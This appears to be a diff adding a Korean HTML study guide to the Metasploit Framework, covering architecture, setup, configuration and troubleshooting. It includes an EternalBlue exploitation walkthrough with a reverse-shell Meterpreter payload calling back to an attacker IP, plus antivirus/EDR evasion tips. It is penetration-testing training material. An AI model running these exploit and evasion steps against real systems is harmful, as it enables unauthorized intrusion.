@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Metasploit Framework 실무 스터디 가이드 | AI 정보보안 엔지니어</title>
+    <style>
+        :root {
+            --bg: #0d1117;
+            --surface: #161b22;
+            --surface2: #1c2333;
+            --border: #30363d;
+            --text: #e6edf3;
+            --text-muted: #8b949e;
+            --accent: #58a6ff;
+            --accent2: #3fb950;
+            --accent3: #d2a8ff;
+            --accent4: #f0883e;
+            --danger: #f85149;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+        }
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            line-height: 1.6;
+            padding: 0 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        a {
+            color: var(--accent);
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .hero {
+            text-align: center;
+            padding: 60px 20px 40px;
+            border-bottom: 1px solid var(--border);
+            margin-bottom: 40px;
+        }
+        .hero h1 {
+            font-size: 2.8rem;
+            margin-bottom: 10px;
+            background: linear-gradient(90deg, var(--accent), var(--accent3));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .hero .subtitle {
+            font-size: 1.2rem;
+            color: var(--text-muted);
+            margin-bottom: 25px;
+        }
+        .meta-badges {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .badge {
+            background-color: var(--surface2);
+            color: var(--text-muted);
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            border: 1px solid var(--border);
+        }
+        .toc {
+            background-color: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 25px;
+            margin-bottom: 40px;
+        }
+        .toc h2 {
+            margin-bottom: 15px;
+            color: var(--accent);
+        }
+        .toc ol {
+            list-style-type: decimal;
+            padding-left: 25px;
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 8px;
+        }
+        .toc li {
+            margin-bottom: 8px;
+        }
+        .section {
+            margin-bottom: 60px;
+            scroll-margin-top: 20px;
+        }
+        .section h2 {
+            font-size: 1.8rem;
+            color: var(--accent2);
+            padding-bottom: 10px;
+            border-bottom: 2px solid var(--border);
+            margin-bottom: 25px;
+        }
+        .section h3 {
+            font-size: 1.4rem;
+            color: var(--accent4);
+            margin: 20px 0 15px;
+        }
+        .concept-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 25px 0;
+        }
+        .concept-card {
+            background-color: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 20px;
+            transition: transform 0.2s, border-color 0.2s;
+        }
+        .concept-card:hover {
+            transform: translateY(-3px);
+            border-color: var(--accent);
+        }
+        .concept-card h4 {
+            color: var(--accent3);
+            margin-bottom: 10px;
+            font-size: 1.2rem;
+        }
+        .callout {
+            background-color: var(--surface2);
+            border-left: 4px solid var(--accent);
+            padding: 18px;
+            border-radius: 4px;
+            margin: 20px 0;
+        }
+        .callout.warn {
+            border-left-color: var(--danger);
+        }
+        .diagram {
+            background-color: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 25px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            line-height: 1.4;
+            white-space: pre;
+            overflow-x: auto;
+            margin: 25px 0;
+            color: var(--accent2);
+        }
+        pre, code {
+            font-family: 'Courier New', monospace;
+            background-color: var(--surface);
+            border-radius: 4px;
+        }
+        pre {
+            padding: 20px;
+            border: 1px solid var(--border);
+            overflow-x: auto;
+            margin: 20px 0;
+        }
+        code {
+            padding: 2px 6px;
+            font-size: 0.9em;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 25px 0;
+            background-color: var(--surface);
+            border: 1px solid var(--border);
+        }
+        th, td {
+            border: 1px solid var(--border);
+            padding: 12px 15px;
+            text-align: left;
+        }
+        th {
+            background-color: var(--surface2);
+            color: var(--accent);
+            font-weight: 600;
+        }
+        tr:nth-child(even) {
+            background-color: rgba(255,255,255,0.02);
+        }
+        footer {
+            text-align: center;
+            padding: 40px 20px;
+            border-top: 1px solid var(--border);
+            margin-top: 40px;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+        .tag-list {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+        .tag {
+            background-color: var(--surface2);
+            color: var(--accent);
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+        }
+    </style>
+</head>
+<body>
+    <header class="hero" id="top">
+        <h1>Metasploit Framework 실무 스터디 가이드</h1>
+        <p class="subtitle">AI 정보보안 엔지니어 · 보안 전문가를 위한 핵심 요약</p>
+        <div class="meta-badges">
+            <span class="badge">레드팀 / 펜테스트</span>
+            <span class="badge">Exploitation Framework</span>
+            <span class="badge">버전: 6.4+</span>
+            <span class="badge">작성일: 2026.03</span>
+        </div>
+    </header>
+
+    <nav class="toc">
+        <h2>📚 목차</h2>
+        <ol>
+            <li><a href="#section1">Metasploit Framework란?</a></li>
+            <li><a href="#section2">왜 써야 하는가? (기존 대안 비교)</a></li>
+            <li><a href="#section3">핵심 개념과 아키텍처</a></li>
+            <li><a href="#section4">퀵스타트: 설치부터 첫 Exploit까지</a></li>
+            <li><a href="#section5">핵심 설정 레퍼런스</a></li>
+            <li><a href="#section6">실무 팁 & 트러블슈팅</a></li>
+            <li><a href="#section7">참고 자료</a></li>
+        </ol>
+    </nav>
+
+    <main>
+        <section class="section" id="section1">
+            <h2>1. Metasploit Framework란?</h2>
+            <p>Metasploit Framework(MSF)는 침투 테스트(Penetration Testing) 및 취약점 연구를 위한 오픈 소스 플랫폼입니다. 취약점 탐지, 익스플로잇 개발, 페이로드 생성, 포스트 익스플로잇까지 통합된 워크플로우를 제공합니다.</p>
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <h4>📦 모듈성</h4>
+                    <p>Exploit, Payload, Auxiliary, Encoder, Post 등 모듈화된 구조로 확장성과 재사용성이 뛰어납니다. Python/Ruby로 커스텀 모듈 작성 가능.</p>
+                </div>
+                <div class="concept-card">
+                    <h4>⚙️ 자동화</h4>
+                    <p>반복적인 테스트 작업을 자동화하고, Resource Script(.rc)를 통해 복잡한 공격 시나리오를 배치 실행할 수 있습니다.</p>
+                </div>
+                <div class="concept-card">
+                    <h4>🔗 통합 생태계</h4>
+                    <p>Nmap, Nessus 결과 연동, Meterpreter 세션 관리, C2(Command & Control) 통합 등 레드팀 운영의 핵심 도구입니다.</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="section" id="section2">
+            <h2>2. 왜 써야 하는가? (기존 대안 비교)</h2>
+            <p>다양한 익스플로잇 도구가 존재하지만, MSF는 포괄성과 커뮤니티 지원에서 차별화됩니다.</p>
+            <table>
+                <thead>
+                    <tr>
+                        <th>도구 / 프레임워크</th>
+                        <th>주요 특징</th>
+                        <th>Metasploit 대비 장단점</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Metasploit Framework</strong></td>
+                        <td>통합 플랫폼, 대규모 모듈 DB, GUI/CLI 지원, 활발한 커뮤니티</td>
+                        <td><strong>장점:</strong> 가장 포괄적, 문서화 잘됨, 레드팀 표준<br><strong>단점:</strong> 무겁고, 탐지 쉬움(Signature)</td>
+                    </tr>
+                    <tr>
+                        <td>Cobalt Strike</td>
+                        <td>상용 레드팀 툴, 고급 C2, 협업 기능, 에뮬레이션</td>
+                        <td><strong>장점:</strong> 은닉성, 협업 툴<br><strong>단점:</strong> 비용, 오픈 소스 아님</td>
+                    </tr>
+                    <tr>
+                        <td>Core Impact / Canvas</td>
+                        <td>상용 통합 펜테스트 플랫폼</td>
+                        <td><strong>장점:</strong> 엔터프라이즈 지원<br><strong>단점:</strong> 고가, 폐쇄적</td>
+                    </tr>
+                    <tr>
+                        <td>자체 제작 스크립트</td>
+                        <td>Python, PowerShell 등으로 특정 공격 맞춤 제작</td>
+                        <td><strong>장점:</strong> 정밀함, 탐지 회피 가능<br><strong>단점:</strong> 개발/유지보수 비용, 재사용성 낮음</td>
+                    </tr>
+                </tbody>
+            </table>
+            <div class="callout">
+                <strong>💡 선택 가이드:</strong> 빠른 프로토타이핑, 교육, 표준화된 테스트에는 MSF. 고객 맞춤형, 은닉성이 중요한 운영에는 Cobalt Strike나 자체 툴을 고려하세요.
+            </div>
+        </section>
+
+        <section class="section" id="section3">
+            <h2>3. 핵심 개념과 아키텍처</h2>
+            <p>MSF는 계층적 아키텍처로 설계되어 사용자 인터페이스(CLI/GUI)부터 저수준 익스플로잇 실행까지 분리됩니다.</p>
+            <div class="diagram">
+┌─────────────────────────────────────────────────────────────┐
+│                    User Interface Layer                      │
+│  (msfconsole, msfcli, Armitage, Web UI, Python API)         │
+└────────────────────────────┬────────────────────────────────┘
+                             │
+┌────────────────────────────▼────────────────────────────────┐
+│                 Framework Core (Ruby)                        │
+│  - Module Management (Exploit, Payload, Auxiliary...)       │
+│  - Session Management (Meterpreter, Shell, VNC...)          │
+│  - Job & Resource Scheduling                                │
+└────────────────────────────┬────────────────────────────────┘
+                             │
+┌────────────────────────────▼────────────────────────────────┐
+│                 Rex (Ruby Extension) Library                 │
+│  - Protocol Handling (HTTP, SMB, SSH, ...)                  │
+│  - Encoding/Encryption                                      │
+│  - Socket Abstraction                                       │
+└────────────────────────────┬────────────────────────────────┘
+                             │
+┌────────────────────────────▼────────────────────────────────┐
+│                 Module & Plugin Ecosystem                    │
+│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐       │
+│  │ Exploit  │ │ Payload  │ │Auxiliary │ │  Post    │ ...   │
+│  │ Modules  │ │ Modules  │ │ Modules  │ │ Modules  │       │
+│  └──────────┘ └──────────┘ └──────────┘ └──────────┘       │
+└─────────────────────────────────────────────────────────────┘
+            </div>
+            <h3>주요 컴포넌트</h3>
+            <ul>
+                <li><strong>msfconsole</strong>: 가장 강력한 CLI 인터페이스. 대화형 환경 제공.</li>
+                <li><strong>Meterpreter</strong>: 고급 메모리 상 주입 페이로드. 파일 시스템, 키로깅, 권한 상승 등 확장 기능.</li>
+                <li><strong>Database</strong>: PostgreSQL와 연동해 작업 결과, 호스트, 서비스 정보를 구조화.</li>
+                <li><strong>Resource Script (.rc)</strong>: 자동화 스크립트. <code>msfconsole -r script.rc</code></li>
+            </ul>
+        </section>
+
+        <section class="section" id="section4">
+            <h2>4. 퀵스타트: 설치부터 첫 Exploit까지</h2>
+            <h3>단계 1: 설치 (Kali Linux / Ubuntu 기준)</h3>
+            <pre><code># Kali에는 기본 설치됨. 업데이트:
+sudo apt update && sudo apt install metasploit-framework -y
+
+# Ubuntu/Debian 설치:
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+chmod +x msfinstall
+sudo ./msfinstall</code></pre>
+
+            <h3>단계 2: 데이터베이스 설정 (선택, 권장)</h3>
+            <pre><code># PostgreSQL 서비스 시작
+sudo systemctl start postgresql
+sudo systemctl enable postgresql
+
+# MSF 데이터베이스 초기화
+sudo msfdb init
+
+# 상태 확인
+msfconsole -q
+msf6 > db_status
+[*] postgresql connected to msf</code></pre>
+
+            <h3>단계 3: 첫 번째 Exploit 실행 (예: EternalBlue MS17-010)</h3>
+            <pre><code># msfconsole 실행
+sudo msfconsole -q
+
+# 익스플로잇 모듈 검색 및 사용
+msf6 > search eternalblue
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+
+# 필수 옵션 설정 (RHOSTS는 타겟 IP)
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.10  # 공격자 IP
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
+
+# 익스플로잇 실행
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
+
+[*] Started reverse TCP handler on 192.168.1.10:4444
+[*] 192.168.1.100:445 - Connecting to target for exploitation...
+[+] 192.168.1.100:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+...</code></pre>
+            <div class="callout warn">
+                <strong>⚠️ 주의:</strong> 이 예제는 합법적으로 소유하거나 허가받은 환경에서만 실행하세요. 무단 테스트는 법적 문제를 일으킬 수 있습니다.
+            </div>
+
+            <h3>단계 4: Python을 통한 간단한 자동화 예제</h3>
+            <pre><code>#!/usr/bin/env python3
+"""
+Metasploit RPC API를 이용한 Python 자동화 예제
+(msfrpcd 데몬이 실행 중이어야 함)
+"""
+import msfrpc
+
+# 클라이언트 생성
+client = msfrpc.Msfrpc({})
+client.login('msf', 'password')  # msfrpcd 자격 증명
+
+# 콘솔 생성
+console_id = client.call('console.create')['id']
+
+# 명령어 실행: Nmap 스캔
+cmd = "db_nmap -sV -O 192.168.1.0/24"
+client.call('console.write', [console_id, cmd])
+
+# 결과 읽기
+import time
+time.sleep(30)  # 스캔 대기
+result = client.call('console.read', [console_id])
+print(result['data'])
+
+# 호스트 목록 조회
+hosts = client.call('host.list')
+print(f"발견된 호스트: {len(hosts)}")</code></pre>
+        </section>
+
+        <section class="section" id="section5">
+            <h2>5. 핵심 설정 레퍼런스</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>설정 항목</th>
+                        <th>기본값 / 예시</th>
+                        <th>설명</th>
+                        <th>관련 명령어</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Database 연결</strong></td>
+                        <td>postgresql://msf:msf@127.0.0.1/msf</td>
+                        <td>작업 결과 저장. 필수는 아니지만 실무에서 강력 권장.</td>
+                        <td><code>db_status</code>, <code>workspace</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>LHOST / LPORT</strong></td>
+                        <td>192.168.1.10 / 4444</td>
+                        <td>리버스 쉘/커넥션을 받을 공격자 주소와 포트.</td>
+                        <td><code>set LHOST</code>, <code>set LPORT</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>PAYLOAD</strong></td>
+                        <td>windows/x64/meterpreter/reverse_tcp</td>
+                        <td>익스플로잇 성공 후 실행될 페이로드. 타겟 OS/아키텍처에 맞춰 선택.</td>
+                        <td><code>show payloads</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Exploit Target</strong></td>
+                        <td>0 (Auto)</td>
+                        <td>다중 타겟 익스플로잇에서 특정 OS/버전 지정.</td>
+                        <td><code>show targets</code>, <code>set TARGET</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Session 통신</strong></td>
+                        <td>HTTP / HTTPS / TCP</td>
+                        <td>Meterpreter 세션 통신 프로토콜. 방화벽 우회 시 변경.</td>
+                        <td><code>set PAYLOAD .../reverse_http</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>AutoRunScript</strong></td>
+                        <td>post/windows/manage/migrate</td>
+                        <td>세션 획득 시 자동 실행할 스크립트. 프로세스 마이그레이션 등.</td>
+                        <td><code>set AutoRunScript</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>VERBOSE</strong></td>
+                        <td>false</td>
+                        <td>상세 출력 모드. 디버깅 시 true로 설정.</td>
+                        <td><code>set VERBOSE true</code></td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <section class="section" id="section6">
+            <h2>6. 실무 팁 & 트러블슈팅</h2>
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <h4>🚀 성능 팁</h4>
+                    <ul>
+                        <li><strong>데이터베이스 사용:</strong> 모든 스캔/익스플로잇 결과를 DB에 저장해 후속 분석 속도 향상.</li>
+                        <li><strong>Resource Script:</strong> 반복 작업은 .rc 파일로 자동화. <code>msfconsole -r auto.rc</code></li>
+                        <li><strong>세션 관리:</strong> 백그라운드 세션(<code>background</code>) 활용해 다중 타겟 동시 작업.</li>
+                    </ul>
+                </div>
+                <div class="concept-card">
+                    <h4>🛡️ 탐지 회피</h4>
+                    <ul>
+                        <li><strong>페이로드 인코딩:</strong> <code>msfvenom</code>으로 시그니처 변조. 다중 인코딩 적용.</li>
+                        <li><strong>Meterpreter 통신 암호화:</code> HTTPS, XOR 동적 암호화 사용.</li>
+                        <li><strong>세션 마이그레이션:</strong> 취득 즉시 <code>migrate</code>로 프로세스 이동.</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h3>자주 겪는 문제 & 해결책</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>문제</th>
+                        <th>원인</th>
+                        <th>해결책</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>"Exploit failed: No target was specified."</td>
+                        <td>타겟 옵션(TARGET)이 설정되지 않음.</td>
+                        <td><code>show targets</code>로 가능한 타겟 확인 후 <code>set TARGET &lt;id&gt;</code></td>
+                    </tr>
+                    <tr>
+                        <td>Meterpreter 세션 바로 종료</td>
+                        <td>AV/EDR 탐지, 방화벽에서 아웃바운드 연결 차단.</td>
+                        <td>인코딩 적용, 통신 포트/프로토콜 변경(예: 443 HTTPS), staged payload 사용.</td>
+                    </tr>
+                    <tr>
+                        <td>db_nmap 결과가 데이터베이스에 안 뜸</td>
+                        <td>데이터베이스 연결 안됨 또는 workspace 문제.</td>
+                        <td><code>db_status</code> 확인, <code>workspace -a new_workspace</code>로 새 작업공간 생성.</td>
+                    </tr>
+                    <tr>
+                        <td>익스플로잇은 성공했으나 세션 없음</td>
+                        <td>페이로드와 타겟 아키텍처 불일치, 메모리 보호(ASLR, DEP).</td>
+                        <td>페이로드 아키텍처 확인(x86/x64), 마이그레이션 옵션 설정, 다른 페이로드 시도.</td>
+                    </tr>
+                    <tr>
+                        <td>msfconsole 시작 시 Ruby 오류</td>
+                        <td>Gem 라이브러리 충돌 또는 손상된 설치.</td>
+                        <td><code>sudo gem cleanup</code>, 또는 <code>sudo apt reinstall metasploit-framework</code></td>
+                    </tr>
+                </tbody>
+            </table>
+            <div class="callout">
+                <strong>📝 로깅 & 디버깅:</strong> 문제 발생 시 <code>set VERBOSE true</code>로 상세 출력을 확인하고, <code>logs</code> 디렉토리에서 프레임워크 로그를 검토하세요.
+            </div>
+        </section>
+
+        <section class="section" id="section7">
+            <h2>7. 참고 자료</h2>
+            <ul>
+                <li><a href="https://docs.metasploit.com/" target="_blank">📘 공식 Metasploit Documentation</a> - 가장 정확하고 최신의 정보원.</li>
+                <li><a href="https://github.com/rapid7/metasploit-framework" target="_blank">🐙 GitHub Repository</a> - 소스 코드, 이슈 트래킹, 컨트리뷰션.</li>
+                <li><a href="https://www.offensive-security.com/metasploit-unleashed/" target="_blank">🔥 Metasploit Unleashed (Offensive Security)</a> - 무료 고급 교재.</li>
+                <li><a href="https://blog.rapid7.com/tags/metasploit" target="_blank">✍️ Rapid7 블로그</a> - 새로운 모듈, 기능 발표 및 사용 사례.</li>
+                <li><strong>도서:</strong> "Metasploit: The Penetration Tester's Guide" (No Starch Press)</li>
+            </ul>
+            <div class="callout">
+                <strong>🔮 향후 학습 방향:</strong> MSF에 익숙해진 후, <strong>Cobalt Strike 연동</strong>, <strong>자체 커스텀 모듈 개발(Ruby)</strong>, <strong>AV/EDR 완전 회피 기법</strong>을 깊이 있게 공부하세요.
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <p>© 2026 Metasploit Framework 실무 스터디 가이드. 교육 및 합법적 보안 평가 목적으로만 사용하세요.</p>
+        <p>문의: security-engineering@example.com | 버전: 1.0</p>
+        <div class="tag-list">
+            <span class="tag">pentest</span>
+            <span class="tag">exploitation</span>
+            <span class="tag">red-team</span>
+            <span class="tag">metasploit</span>
+            <span class="tag">cybersecurity</span>
+            <span class="tag">ai-engineer</span>
+        </div>
+        <p style="margin-top:20px;"><a href="#top">⬆ 페이지 상단으로 이동</a></p>
+    </footer>
+</body>
+</html>
